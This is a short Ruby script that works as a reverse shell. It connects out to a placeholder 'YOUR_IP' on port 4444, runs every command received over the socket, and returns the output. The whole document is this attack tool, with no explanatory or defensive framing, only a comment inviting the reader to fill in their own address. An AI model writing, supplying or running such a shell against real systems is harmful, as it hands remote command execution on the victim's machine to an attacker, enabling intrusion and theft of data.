require 'socket'
require 'open3'

# Replace with your IP and por
host = "YOUR_IP"
port = 4444

# Create a reverse TCP connection
s = TCPSocket.new(host, port)

# Redirect STDIN, STDOUT, STDERR to the socket
s.puts "Connected!"
loop do
  cmd = s.gets.chomp
  break if cmd.downcase == "exit"
  
  # Execute the command and send output back
  begin
    Open3.popen2e(cmd) do |_, stdout_err, _|
      output = stdout_err.read
      s.puts output
    end
  rescue => e
    s.puts "Error: #{e.message}"
  end
end
s.close
